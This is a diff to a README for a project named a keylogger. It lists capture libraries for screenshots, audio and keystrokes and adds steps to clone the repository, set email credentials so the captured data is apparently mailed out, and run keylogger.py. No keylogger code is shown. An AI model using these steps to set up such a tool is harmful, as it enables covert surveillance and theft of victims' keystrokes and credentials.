@@ -27,3 +27,17 @@ You can install the required libraries using pip3:
 
 ```bash
 pip3 install pyscreenshot sounddevice pynput
+
+## Setup
+
+1: ```bash
+git clone https://github.com/yourusername/keylogger.git
+cd keylogger
+
+2: ```bash
+export EMAIL_ADDRESS="your_email@gmail.com"
+export EMAIL_PASSWORD="your_password"
+
+3: ```bash
+python keylogger.py
+
